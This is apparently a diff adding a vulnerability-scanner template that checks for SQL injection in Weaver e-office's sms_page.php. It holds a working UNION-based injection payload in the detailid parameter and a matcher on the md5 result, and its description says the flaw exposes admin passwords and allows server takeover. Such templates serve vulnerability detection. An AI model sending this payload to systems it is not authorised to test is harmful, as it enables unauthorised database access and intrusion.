@@ -1,0 +1,19 @@
+id: fanwei-eoffice-smspage-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 泛微e-office json_common.php、flow_xml.php、sms_page.php、getUserLists、detail.php、Init.php等接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/F8-11%E6%B3%9B%E5%BE%AE-E-Office-SQL?id=f8-11%e6%b3%9b%e5%be%ae-e-office-sql
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}//E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0'
